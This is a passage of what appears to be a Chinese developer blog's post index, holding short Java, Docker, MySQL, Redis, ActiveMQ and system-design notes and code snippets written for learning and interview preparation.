if (!ResultUtil.isResultSuccess(paramCheck)) { throw new BusinessRuntimeException(paramCheck.getCode(), paramCheck.getMessage()); } if (!CollectionUtils.isEmpty(paramCheck.getResult())) { throw new BusinessRuntimeException(ResultCodeEnum.RULE_PARAM_ERROR.getCode(), JSON.toJSONString(paramCheck.getResult())); } rules.sort(Comparator.comparing(Rule::getSort)); ActivityPartRuleRequest activityPartRuleRequest = new ActivityPartRuleRequest(); activityPartRuleRequest.setContextParam(contextParam); ExecResult&lt;String&gt; result = activityRuleEngine.validate(activityPartRuleRequest, rules); if (!ResultUtil.isResultSuccess(result)) { throw new BusinessRuntimeException(result.getCode(), result.getMessage()); } if (StringUtils.isNotBlank(result.getResult())) { throw new BusinessRuntimeException(ResultCodeEnum.RULE_CHECK_FAIL.getCode(), result.getResult()); } return; } /** * 执行操作 * 各子类自行实现，完成各种动作 * * @param contextParam */ protected abstract void doAction(ContextParam contextParam);","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"设计模式","slug":"设计模式","permalink":"http://www.hasfun.cn/tags/设计模式/"}]},{"title":"程序命名神器","slug":"程序命名神器","date":"2019-06-29T15:44:44.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/06/29/程序命名神器/","link":"","permalink":"http://www.hasfun.cn/2019/06/29/程序命名神器/","excerpt":"","text":"知乎上有这样一个帖子，编程的时候 命名 方法或变量 词穷了怎么办？底下有一段这样的回复：“计算机科学的两件难事：缓存失效和命名。” 词汇量缺乏的我，尽管爬梯子Google也找不到贴切的名字，现在这家公司，有个博士程序员，我膜拜了下他的代码，整个项目都是英文注释，让人肃然起敬，猛不丁以为读源码的感觉。英语好，很重要啊，起码代码让人读起来很专业，可惜大学只过了四级，不过老外抓住了很多程序员的痛点，搞了一个这样的网站，方便程序员给定义的方法或者变量起一个准确的命名。CODELF","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"规范命名","slug":"规范命名","permalink":"http://www.hasfun.cn/tags/规范命名/"}]},{"title":"【在线工具】免安装练习Redis命令","slug":"【在线工具】免安装练习Redis命令","date":"2019-06-29T15:38:27.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/06/29/【在线工具】免安装练习Redis命令/","link":"","permalink":"http://www.hasfun.cn/2019/06/29/【在线工具】免安装练习Redis命令/","excerpt":"","text":"Redis学习工具，二大利器 免安装Redis，在线学习命令 Redis命令大全","categories":[{"name":"工具","slug":"工具","permalink":"http://www.hasfun.cn/categories/工具/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"http://www.hasfun.cn/tags/Redis/"}]},{"title":"docker搭建mongoDB过程记录","slug":"docker搭建mongoDB过程记录","date":"2019-06-29T15:31:31.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/06/29/docker搭建mongoDB过程记录/","link":"","permalink":"http://www.hasfun.cn/2019/06/29/docker搭建mongoDB过程记录/","excerpt":"","text":"最近用笔记本用了几次docker，感觉特别轻巧，方便，相较6年前用虚拟机VM那种笨重感再也没有了。有个好处就是，搭建环境很轻便。想起网上的段子，“大象塞进冰箱要几步”，不管要多少步，总得先弄头大象吧，学习一门新技术也是如此，比如我最近在看mongo，不管懂不懂，先装一个mongodb敲个hello world练练手。在新公司，牛逼的代码倒是没看见，新技术倒是不少，趁着这样的环境多学习多练习也是极好的，下面记录下我安装MongoDB的过程. 下载镜像docker pull mongo 下载docker官方仓库提供的最近版本的镜像 docker images#查询是否有mongo镜像 开启MongoDB容器docker run -d -p 27017:27017 -v mongo_configdb:/data/configdb -v mongo_db:/data/db --name mongo docker.io/mongo 镜像映射的端口号是27017， 配置文件的位置在/data/configdb 数据库文件的位置在/data/db docker container ls# 查询容器是否已经启动 docker stop mongo #停止mongo docker rm mongo #删除mongo容器 利用客户端连接Robo 3T可以连接MongoDB的免费客户端。就可以登录到mongoDB服务器，执行CURD了。","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"mongoDB","slug":"mongoDB","permalink":"http://www.hasfun.cn/tags/mongoDB/"},{"name":"docker","slug":"docker","permalink":"http://www.hasfun.cn/tags/docker/"}]},{"title":"营销平台设计思路","slug":"营销平台设计思路","date":"2019-06-22T08:49:48.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/06/22/营销平台设计思路/","link":"","permalink":"http://www.hasfun.cn/2019/06/22/营销平台设计思路/","excerpt":"","text":"刚进公司第一周，老大就安排了一个营销平台的需求给我做，活动方式是这样的：用户完成不同梯度的任务数可以获得相应的奖励，在活动期间，必须完成其中一个任务。产品的文档大概也只是多修饰了一下就完事了，产品设计的专业性不提也罢。项目期望是7月1号上线，带我的老大挺照顾我的，报了二周。不过我一周就完成了。目前的代码是简单粗暴的写法，扩展性不太好。在我完成功能的前提下，我进行了代码重构，用活动奖品的规则，我用策略模式+spring抽离出来，活动礼品的领取逻辑用模板模式给抽离出来，代码整洁了很多。 好的产品，需要打磨，此刻我才感觉自己像个匠人，在打磨自己的艺术品。 目前系统臃肿，没有结构化，代码臃肿，不易扩展。将此类营销平台，功能模块抽象成组件，理想的状态是，市场要求上一个活动，只需要后台简单的配置一下就可以了，又或者将相关的组件组合一下就成新的活动了。这次找工作过程中，阿里系的总监的教会了我去思考领域模型，比如订单系统有领域模型，营销平台当然也有营销的领域模型，就是书上总提到了DDD领域驱动开发，经过一番查询，先人早就总结了一套营销系统体系了，故做下总结，便于后续设计此类系统，可以站在巨人的肩膀上。 营销活动的目的 邀新 留存 促活 营销活动的难点 开发的复杂性安全性和性能要求高，功能多规则多 开发的成本普通活动开发也要一周，加上测试，周期长，大型的要2-3周。遇到节假日某些爆点营销，时间要求更紧张。 希望解决以下问题： 组件化，产品模块解耦 可扩展性强，对不同形式的营销形式兼容性高 保证营销活动的安全性 代码规范，包名统一，异步化，日志规范化统一管理打印。 域对象 统一路由组件 请求路由分发，全局异常捕获，日志打印 配置活动解析引擎 不同类型的活动配置组装，关联规则集合和动作集合 规则引擎 规则执行检验器 Rule条件集合 渠道状态规则，活动时间规则，活动状态规则，活动人群规则，参与次数规则等等 Action动作集合 发放红包，记录参与记录，通知用户等等 奖励组件 红包发放 通知组件 PUSH通知，短信提醒等等触达方式 统计组件 数据埋点，活动效果 安全中心 风险控制，黑白名单 后台管理 运营活动设置","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"营销平台","slug":"营销平台","permalink":"http://www.hasfun.cn/tags/营销平台/"}]},{"title":"搭建mysql主从复制","slug":"搭建mysql主从复制","date":"2019-06-16T11:43:00.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/06/16/搭建mysql主从复制/","link":"","permalink":"http://www.hasfun.cn/2019/06/16/搭建mysql主从复制/","excerpt":"","text":"Master创建复制账号mysql&gt; GRANT REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO repl@&#39;192.168.0.%&#39; IDENTIFIED BY &#39;slave&#39;,; Master 上的配置vi /etc/my.cnf 在my.cnf文件中加入如下配置内容 [mysqld] log-bin=mysql-bin server-id=1 从节点（Slave）配置修改 Slave 的配置文件/etc/my.cnf vi /etc/my.cnf 在my.cnf文件中加入如下配置内容 [mysqld server-id=2 启动复制1.获取主节点当前binary log文件名和位置（position） mysql&gt; SHOW MASTER STATUS; 2.通过1的查询结果，在从（Slave）节点上设置主节点参数 mysql&gt; CHANGE MASTER TO MASTER_HOST=&#39;server1&#39;, -&gt; MASTER_USER=&#39;repl&#39;, -&gt; MASTER_PASSWORD=&#39;slave&#39;, -&gt; MASTER_LOG_FILE=&#39;mysql-bin.000001&#39;, -&gt; MASTER_LOG_POS=0; 3.查看主从同步状态 mysql&gt; show slave status\\G; 4.开启主从同步 mysql&gt; start slave;","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"http://www.hasfun.cn/tags/Mysql/"}]},{"title":"利用docker搭建mysql开发环境","slug":"利用docker搭建mysql开发环境","date":"2019-06-16T05:47:49.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/06/16/利用docker搭建mysql开发环境/","link":"","permalink":"http://www.hasfun.cn/2019/06/16/利用docker搭建mysql开发环境/","excerpt":"","text":"docker真是一个好东西。以前我们安装一个mysql可能需要以下几步： 下载应用程序 解压、安装 配置 使用docker后 下载镜像 启动容器 完成 具体操作： $ docker pull mysql #下载最新的MYSQL镜像 $ docker run -p 3306:3306 --name mysql -e MYSQL_ROOT_PASSWORD=123456 -d mysql #启动mysql容器 通过以下命令查看有没有成功 $ docker image ls #查询MYSQL镜像 $ docker ps #查看mysql容器 $ docker container ls #查询正在运行的容器 最新版本的mysql8，官网说比之前的性能快了2倍，今天在测试使用sqlyog或者navicat 去 连接MySQL8.0 的时候，出现如下报错提示： ERROR 2059 (HY000): Authentication plugin &#39;caching_sha2_password&#39; cannot be loaded 查了网上的帖子，方案如下： docker exec -it mysql bash#进入mysql容器 mysql -u root -p 123456; SELECT `user`, `host`, `authentication_string`, `plugin` FROM mysql.user;#查询root的账号的密码验证插件类型 修改root账号的密码验证插件类型： ALTER USER &#39;root&#39;@&#39;%&#39; IDENTIFIED WITH mysql_native_password BY &#39;root&#39;; flush privileges; 再用sqlyog或者navicat登陆一下，大功告成","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://www.hasfun.cn/tags/docker/"}]},{"title":"ActiveMq的Topic消息模式，订阅者宕机重启，消息丢失的解决方案","slug":"ActiveMq的Topic消息模式，订阅者宕机重启，消息丢失的解决方案","date":"2019-06-15T16:19:47.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/06/16/ActiveMq的Topic消息模式，订阅者宕机重启，消息丢失的解决方案/","link":"","permalink":"http://www.hasfun.cn/2019/06/16/ActiveMq的Topic消息模式，订阅者宕机重启，消息丢失的解决方案/","excerpt":"","text":"消息队列中间件ActiveMq，我熟知的应用场景有，异步处理，削峰平谷和应用解耦，可扩展性，还有一个不经常想到的，解决并发问题。 异步处理比如订单系统，订单创建的流程很长，有订单号的生成，优惠券的使用，配送流程，库存的扣减，通知邮件与短信，如果传统的做法，串行化处理这些流程，那么这一次的请求链路消耗的时间特别长，影响客户体验，占用线程资源过长时间，吞吐量自然上不去，比如可以将邮件，短信作为消息发给MQ，让邮件，短信平台来消费，异步处理，提高了系统的响应速度。 削峰平谷在做促销抢购活动期间，高并发的订单请求，数据库的瓶颈就出现了，大量的读写操作，瞬间压爆数据库，我们可以借助MQ来给高并发请求做个缓冲，某些场景下可以设置队列长度，如果超过队列的容量直接拒绝用户请求，比如小米官网的手机抢购。 应用解耦分布式系统中，系统之间通信相互依赖，耦合度高，如果某个接口服务宕机了，就会影响依赖方。比如下单接口之间调用库存系统的话，库存系统宕机的话，下单接口就直接失败了，但是如果下单请求推给MQ，由库存系统消费，如果库存系统宕机了，也不会影响下单。 可扩展性电商系统，下单订单，会有通知用户下单结果，方式有邮件，短信，如果后续需要有下单送优惠券的功能，然后我们的消息模式是TOPIC模式，就可以新增具有送优惠券功能的订阅者即可，新的功能不需要修改订单系统的代码，符合软件设计的开闭原则，扩展性也非常强。 解决并发问题有这样一个场景，比如这个模块有个定时任务扫描符合条件的会员，然后给会员发积分，如果是部署多台实例，那么会有多个定时任务在送积分，会出现重复捞取到满足条件的会员记录，导致了重复送积分，而MQ的点对点的消息模式，保证只有一个消费者消费同一个消息，只需要安排一台master实例去捞取数据，再发给MQ，让订阅者去消费送积分，很巧妙的解决了并发的问题。 ActiveMQ的使用，带来的一些问题上面聊了一下，ActiveMQ的应用，同时也带来了一些问题。 1：生产者发送消息给MQ服务器，MQ服务器接收到消息后，MQ宕机消息会不会丢失? 2：TOPIC的消息模式下，MQ接收到消息，这时候订阅者宕机了或者重启了，那消息会丢失，有什么解决方案？ 第一个问题，ActiveMq支持消息的持久化，所以MQ服务器宕机了，重启后消息也不会丢失。第二个问题网上也有如下解释： Pub/Sub的特点 每个消息可以有多个消费者发布者和订阅者之间有时间上的依赖性。针对某个主题（Topic）的订阅者&gt; ，它必须创建一个订阅者之后，才能消费发布者的消息为了消费消息，订阅者必须保持运行的状态 为了缓和这样严格的时间相关性，JMS允许订阅者创建一个可持久化的订阅&gt; 。这样，即使订阅者没有被激活（运行），它也能接收到发布者的消息。 解释起来就是，关于发布-订阅的消息模式，即TOPIC，生产者跟消费者之间的时间严格依赖性，JMS提供了解决方案，订阅模式分持久订阅者与非持久订阅者，这样声明成持久订阅者即使宕机了，消息在broker也就是MQ服务器的磁盘里面不会丢失，订阅者重启后仍然可以消费消息。","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"ActiveMq","slug":"ActiveMq","permalink":"http://www.hasfun.cn/tags/ActiveMq/"}]},{"title":"从分布式事务理论，总结途牛火车票的解决方案","slug":"从分布式事务理论，总结途牛火车票的解决方案","date":"2019-05-22T04:25:53.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/05/22/从分布式事务理论，总结途牛火车票的解决方案/","link":"","permalink":"http://www.hasfun.cn/2019/05/22/从分布式事务理论，总结途牛火车票的解决方案/","excerpt":"","text":"为解决单机系统的性能瓶颈，无论我们根据业务垂直拆分系统，还是水平分库分表，都会面临分布式事务的问题。解决此类分布式事务的场景，业内已经提出了一致性原理，如数据库单机的ACID，到后面提出的CAP和BASE定理，继而提出了一致性协议，如2PC,3PC,TCC，最后总结出实现最终一致性的方案。 查询模式 补偿模式 异步确保模式 定期校对模式 支持事务的MQ 那么我做了三年的途牛火车票系统采用的是什么解决方案呢？我们用的也是业界常用的异步确保模式 异步确保模式核心理论是 将分布式事务转成本地事务处理，具体做法就是在每个业务系统维护一个本地消息记录表， 每次发起请求，记录下请求消息状态，也就是将业务数据与消息表放在一个数据库事务中提交， 系统之间可以使用MQ来传递消息，如果消费失败，或者消息没有发送出去，则通过消息表进行补偿。 异步确保模式的弊端就是维护了一份冗余的消息表，需要渗透到业务代码，不过先人也为我们考虑好了解决方案，这一块对消息表的操作已经被封装到rpc客户端的底层代码维护 ，业务系统无需要关心这块的处理。 途牛火车票的实践途牛火车票系统之间，每个系统都有一个请求日志表，系统之间本质是http作为通信协议，底层封装了tsp的客户端请求工具，分布式事务是靠业务方自己实现本地消息表的方案，比如我负责的订单系统，占位，出票，退票，都有记录系统之间的日志表，然后通过日志表的状态进行选择重试或者之间结束流程，以确保系统的最终一致性。比如有一堆订单卡在中间状态，比如占位中，如果消息表没有记录，或者是同步没有反馈，又或者是同步反馈失败，订单系统作为上游系统直接对客失败处理。 这样的系统设计还存在哪些优点与缺点？ 生产者/消费者的消息持久化，防止消息丢失 消息表的定期清理，防止数据量过多影响查询性能。 业务数据与消费发送MQ要在一个事务内执行，确保消息的可靠性。 不支持回滚，依托BASE理论，保证最终一致性 附录聊聊分布式事务，再说说解决方案","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"分布式事务","slug":"分布式事务","permalink":"http://www.hasfun.cn/tags/分布式事务/"},{"name":"分布式一致性","slug":"分布式一致性","permalink":"http://www.hasfun.cn/tags/分布式一致性/"}]},{"title":"可以暂停的线程池","slug":"可以暂停的线程池","date":"2019-05-21T04:28:19.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/05/21/可以暂停的线程池/","link":"","permalink":"http://www.hasfun.cn/2019/05/21/可以暂停的线程池/","excerpt":"","text":"问渠那得清如许，为有源头活水来 这段时间没有更新博客了，不是因为找到工作了而繁忙了，也不是在忙于找工作，而是趁着有空在家带娃了,没有输入哪来的输出。面试的时候最喜欢问线程池了，我遇到的题目有： 线程池的工作原理 Executors 默认的队列为啥没有用arrayBlockingQueue 如何实现将任务不塞入队列中，直接用线工作线程处理 如何暂停线程池中的工作线程 如何实现暂停线程池的工作线程其实这个在线程池源码里面有个例子，这里改造了一下，通过命令控制台输入命令控制线程池。原理是：通过重载线程池提供的beforeExecute（），用lock+condition的wait（）使得工作线程暂停。另外提供一个恢复方法，使用的是lock+condition的signalAll唤醒暂停的工作线程。 public class PauseThreadPool extends ThreadPoolExecutor { private boolean isPaused; private ReentrantLock pauseLock = new ReentrantLock(); private Condition unpaused = pauseLock.newCondition(); public PauseThreadPool(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue) { super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue); } //线程池执行任务之前 protected void beforeExecute(Thread t, Runnable r) { pauseLock.lock(); try { while (isPaused) { unpaused.await(); } } catch (InterruptedException e) { e.printStackTrace(); } finally { pauseLock.unlock(); } } //暂停工作线程 public void pause() { pauseLock.lock(); try { isPaused = true; }finally { pauseLock.unlock(); } } //恢复工作线程 public void resume() { pauseLock.lock(); try { isPaused = false; unpaused.signalAll(); }finally { pauseLock.unlock(); } } //线程池执行任务之前 protected void afterExecute(Runnable r, Throwable t) { System.out.println(&quot;afterExecute task:&quot; + Thread.currentThread().getName()); } //线程池终止时候调用 protected void terminated() { System.out.println(&quot;terminated task:&quot; + Thread.currentThread().getName()); } public static void main(String[] args) { PauseThreadPool pool = new PauseThreadPool(5, 10, 30, TimeUnit.SECONDS, new ArrayBlockingQueue&lt;Runnable&gt;(10)); try { System.out.print(&quot;Enter a char :&quot;); while (true) { Scanner sc = new Scanner(System.in); int val = sc.nextInt(); if (val == 13 || val == 10) { } if (val == 1) {//命令行输入1，暂停 pool.pause(); } else if (val == 2) {//输入2 恢复 pool.resume(); } else if (val == 0) {// 提交任务 pool.submit(new Callable&lt;Object&gt;() { @Override public Object call() throws Exception { System.out.println(&quot;start task:&quot; + Thread.currentThread().getName()); return null; } }); }else if (val == 3){//关闭线程池 pool.shutdown(); } } } catch (Exception e) { e.printStackTrace(); } } }","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"线程池","slug":"线程池","permalink":"http://www.hasfun.cn/tags/线程池/"}]},{"title":"如何写一个程序频繁的FULL GC","slug":"如何写一个程序频繁的FULL-GC","date":"2019-05-10T14:58:57.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/05/10/如何写一个程序频繁的FULL-GC/","link":"","permalink":"http://www.hasfun.cn/2019/05/10/如何写一个程序频繁的FULL-GC/","excerpt":"","text":"public class GcExample { private static final int _1MB=1024*1024; public static void main(String[] args) { while (true){ byte[] b = new byte[4*_1MB]; b=null; System.gc(); } } } System.gc()源码 public static void gc() { Runtime.getRuntime().gc(); } 显示的使用 System.gc()，会导致频繁full gc，这个方法可以在禁用掉在vm options加入 -XX:+DisableExplicitGC 那么System.gc()有什么作用吗？在使用堆外内存的时候，会配合使用。通过-XX:MaxDirectMemorySize来指定最大的堆外内存大小，当使用达到了阈值的时候将调用System.gc来做一次full gc，以此来回收掉没有被使用的堆外内存。","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"GC","slug":"GC","permalink":"http://www.hasfun.cn/tags/GC/"}]},{"title":"HashMap的源码解析","slug":"HashMap的源码解析","date":"2019-05-09T13:04:58.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/05/09/HashMap的源码解析/","link":"","permalink":"http://www.hasfun.cn/2019/05/09/HashMap的源码解析/","excerpt":"","text":"背景最近忙着面试，把学习的东西，通过博客沉淀下来，一方面加深自己的理解，另方面方便以后自己再次复习。HashMap 是面试喜欢问的问题，那么HashMap的原理是什么呢？ HashMap原理HashMap的数据结构是 数组+链表。 数组默认大小等于16，这个数组也称Hash桶。链表是存放Hash冲突的entry对象的。这里该提到数据结构的hash冲突的几种解决方法，hashMap采用的是链地址法。 hash冲突解决的常见办法： 1.开放定址法 2.再哈希法 3.链地址法 4.建立公共溢出区 怎么处理hash冲突当我们向HashMap put一个KV时候，先对KEY做hashCode,为了减少hash冲撞的机会，还经过了扰动函数计算，让hash的更均匀。jdk7在这里扰动了4次而JDK8，做了简化。 计算出来的hashcode与数组的容量进行与运算代替模运算， 因为hash桶只有16个，因此出现hash冲撞的可能性会增大。通过位运算后的值即为key-value存放的位置。当出现hash冲撞的时候，hashmap会将新进来的值塞进链表的尾部，当hash冲撞的机会高的时候，链表的长度也会增大，我们知道链表的查询的时间复杂度是N，jdk8在这里做了改进，具体为当链表长度大于8的时候，会转为红黑树，红黑树的特点是平衡二叉树，查询的时间复杂度是logn. 怎么扩容呢？当hashMap的数组容量超过自己的0.75的时候，也就是默认容量16*0.75=12个的时候，则会进行一次扩容，这里的0.75就是加载因子，12就是阈值。扩容的复杂度很高，先扩容，再移动旧的数组的值到新的数组去，性能会很低,所以我们要减少hashmap的扩容次数，初始化的时候，尽量设置初始容量。接下来，我们看看扩容的过程，先复制一个原来2倍容量的数组，然后重新计算key的hash值，将旧数据搬到新的数组中去，这时候如果有新的数据进来也会插入尾部，会出现争抢位置的并发问题，而HashMap是线程不安全的。 hashMap线程安全的实现方式线程安全的hashMap，使用concurrentHashMap,这个类是基于分段锁。实现HashMap线程安全还有另外一种方法，Collections.synchronized(new HashMap()),但是这种是全部方法加锁的，跟hashtable一样，锁粒度大，效率不好。","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"HashMap","slug":"HashMap","permalink":"http://www.hasfun.cn/tags/HashMap/"},{"name":"源码分析","slug":"源码分析","permalink":"http://www.hasfun.cn/tags/源码分析/"}]},{"title":"Spring多个AOP多注解执行顺序是怎么样的","slug":"Spring多个AOP多注解执行顺序是怎么样的","date":"2019-05-07T10:31:22.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/05/07/Spring多个AOP多注解执行顺序是怎么样的/","link":"","permalink":"http://www.hasfun.cn/2019/05/07/Spring多个AOP多注解执行顺序是怎么样的/","excerpt":"","text":"今天去了杉德面试，整体感觉还好。就spring AOP，对方问了下AOP事务失效的场景有哪些？幸亏之前做了一篇文章，刚好用到了这块的知识spring声明式事务失效的分析过程。另外还问了多个AOP的执行顺序是怎么样的，比如一个方法，有二个AOP注解，那么这2个注解的before，after方法的执行顺序是什么？我脑子是空白的，只是拼着三寸不烂之舌，“这个我平时没注意过，不过是我遇到的话，我会结合当时的业务需求，看执行顺序是否影响再做下一步处理”。回来网上查了下资料，原来答案这样简单，实现order接口，order越小的先执行，当然越小的order的AOP最后才能完成任务。 @Component @Aspect @Slf4j public class MessageQueueAopAspect1 implements Ordered{@Override public int getOrder() { // TODO Auto-generated method stub return 2; } } order越小越是最先执行，也是最后一个执行完成。可以借助下面这张图理解。 由此得出：spring aop就是一个同心圆，要执行的方法为圆心，最外层的order最小。从最外层按照AOP1、AOP2的顺序依次执行doAround方法，doBefore方法。然后执行method方法，最后按照AOP2、AOP1的顺序依次执行doAfter、doAfterReturn方法。也就是说对多个AOP来说，先before的，一定后after。 如果我们要在同一个方法事务提交后执行自己的AOP，那么把事务的AOP order设置为2，自己的AOP order设置为1，然后在doAfterReturn里边处理自己的业务逻辑。 附录 spring多个AOP执行先后顺序","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"Spring","slug":"Spring","permalink":"http://www.hasfun.cn/tags/Spring/"}]},{"title":"分库分表技术储备","slug":"分库分表技术储备","date":"2019-05-06T15:57:29.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/05/06/分库分表技术储备/","link":"","permalink":"http://www.hasfun.cn/2019/05/06/分库分表技术储备/","excerpt":"","text":"背景数据库，很容易成为应用系统的瓶颈。单机数据库的资源与处理能力有限，在高并发的分布式服务中，可采取分库分表突破单机局限。其实，在除了少数的公司流量大，大部分用不上分库分表，主从读写分离这样的架构已经可以满足业务的需求了，可是偏偏面试的时候，mains面试官喜欢问些这些逼格的玩意，我也特意琢磨了一下，并且记录下来技术方案，期待在以后的工作中，尽快落地。 是否需要分库分表？当我们的表记录不超过百万级，不需要分库、分表。如果此时DB性能有问题，可以通过优化SQL，优化索引，增加DB服务器CPU/内存，读写分离。 我们做数据库切分设计的时候，优先垂直切分，读写分离，如果还不行的话，不得不才水平分库分表，切记过度设计。 分库分表的方案 垂直拆分垂直分库：如今微服务盛行，根据业务来划分系统，我们也跟着业务来划分数据库，比如订单库，用户库，这样解决了单机DB服务器的局限。缺点是做查询，聚合数据的时候，需要通过系统之间的接口，聚拢数据再做处理，系统复杂度高。垂直分表：适合在做表设计的时候，表字段比较多，将一些不常用的，数据较大长度过长的字段拆到扩展表去。缺点就是不适合在运行中系统做拆分。 水平拆分水平分表：当表数据超过百万了，那么我们可以采取根据ID的hash到不同分表，但是还是在同个库里面做拆分。缺点就是还是没有摆脱单机的资源局限，所以一般不推荐。 水平分库分表：上面的方案，还是支撑不了我们的业务数据，我们才会采用，将单表的数据量切分到不同的服务器上，每台服务器都有相应的库与表，只是数据集合不同。 水平分库分表的切分策略 根据ID或者时间范围切分，比如1-100000 A1库，100001-200000 A2库… 根据ID/订单号的HASH，比如有4台数据库，%4=1分给A1，%4=2分给A2，%4=3分给A3，%4=0 分给4。 根据时间切分，比如2018年的在A1库，2019年的在A2库。这样导致db负载分布不均匀，老数据比较访问量少，这样浪费了系统资源。 水平分库分表的成熟产品分2种，一个代理模式的有corbar,Mycat,Sharding-jdbc另一种非代理的TDDL 阿里的需要配合Diamond，Mysql官方的Fabric 分库分表面临的问题 分布式事务分布式事务，有现成的产品支持，比如Jotm、Automikos 等来实现，两者均支持 spring 事务整合，但是在高性能高并发系统，不推荐使用。 跨库JOIN，orderby，group by解决方案：数据库层面，冗余字段，加个查询常用的全量表。应用层面，通过系统间组合数据，再做相应的数据处理。 扩容带来的数据迁移 夜间停机影响业务运行，不过一般夜间执行，夜间在线的活跃用户超过1000的用户仅有几家吧。双写法在前面的一篇文章提到过如何平滑数据迁移不影响服务的可用性 总结下来是三步：准备新库，加入双写代码迁移历史数据校验新旧库数据一致性，平滑切到新库。 如何校验数据一致性？校验新旧库的数据量是否一样取新旧库的1-50之间数据然后MD后比对，再取51-100的数据比对，哪里不一致做个标记，再次同步。 参考资源 MySQL 分库分表及其平滑扩容方案 58沈剑：数据库秒级平滑扩容架构方案","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"分库分表","slug":"分库分表","permalink":"http://www.hasfun.cn/tags/分库分表/"}]},{"title":"高并发下，redis热点KEY的解决方案","slug":"高并发下redis热点KEY的解决方案","date":"2019-05-05T12:49:24.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/05/05/高并发下redis热点KEY的解决方案/","link":"","permalink":"http://www.hasfun.cn/2019/05/05/高并发下redis热点KEY的解决方案/","excerpt":"","text":"背景在高并发系统中，我们将多个KEY数据分片，hash均衡分布在redis集群中，如果遇到活动，或者明星的热点新闻，那这台存有热点的KEY的redis实例，遇到百万的流量，这台机器的网卡也恐怕撑不住了，那么redis基本就瘫痪了，服务器抓取不到redis的数据，直接去请求DB，那么db也就遭殃了，于是被领导拖到小黑屋…..那么，有什么解决方案呢？ 解决方案主要分2步 动态统计计算出KEY的请求次数，识别为热点数据 识别出热点数据，通过zookeeper通知服务器更新为本地缓存，Ehcache,又或者是static map，当然要注意防止本地内存溢出。 如何动态识别KEY为热点数据？ 客户端 redis客户端发起redis请求的时候，为每个KEY计数,存在本地缓存，或数据库 代理层redis集群架构加一层，Twemproxy、Codis代理，由代理统计。（推荐） 服务端利用redis的monitor命令 机器TCP流量 参考资料《Redis开发与运维》如果20万用户同时访问一个热点缓存，如何优化你的缓存架构？","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"缓存","slug":"缓存","permalink":"http://www.hasfun.cn/tags/缓存/"}]},{"title":"如何实现缓存击穿，只允许一条线程去DB更新数据","slug":"缓存击穿","date":"2019-05-03T02:21:03.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/05/03/缓存击穿/","link":"","permalink":"http://www.hasfun.cn/2019/05/03/缓存击穿/","excerpt":"","text":"场景使用redis控制缓存的时候，弊端是太依赖于网络与redis服务的稳定性。在高并发的场景下，如果某个KEY过期了，会有很多的GET该KEY的请求，直接会去查询DB，甚至导致DB瘫痪，那么有啥解决方案呢？ 解决方案利用互斥锁，只允许一个线程去DB查询，其他线程等待一段时间重试，当查询DB反馈结果后重新设置到缓存中，那么其他线程直接走缓存就可以了。这里的锁，可以选分布式锁，比如zookeeper锁，JVM锁,redis的setNx互斥锁。 ZooKeeper锁的弊端是，堵塞锁，即只要有线程已经获得锁，其他想获取锁的线程都会等待锁释放，影响QPS。 JVM锁，可以用Lock,Synchronized。推荐的用法是《JAVA并发编程的艺术》提到的concurrentHashMap与futureTask，代码如下`public class CacheUtil { private final ConcurrentMap&lt;Object, Future&gt; taskCache = new ConcurrentHashMap&lt;Object, Future&lt;String&gt;&gt;(); private String executionTask(final String taskName) throws ExecutionException, InterruptedException { while (true) { Future&lt;String&gt; future = taskCache.get(taskName); if (future == null) { Callable&lt;String&gt; task = new Callable&lt;String&gt;() { public String call() throws InterruptedException { return taskName;//loadDb } }; FutureTask&lt;String&gt; futureTask = new FutureTask&lt;String&gt;(task); future = taskCache.putIfAbsent(taskName, futureTask); if (future == null) { future = futureTask; futureTask.run(); } } try { return future.get(); } catch (CancellationException e) { taskCache.remove(taskName, future); } } } } 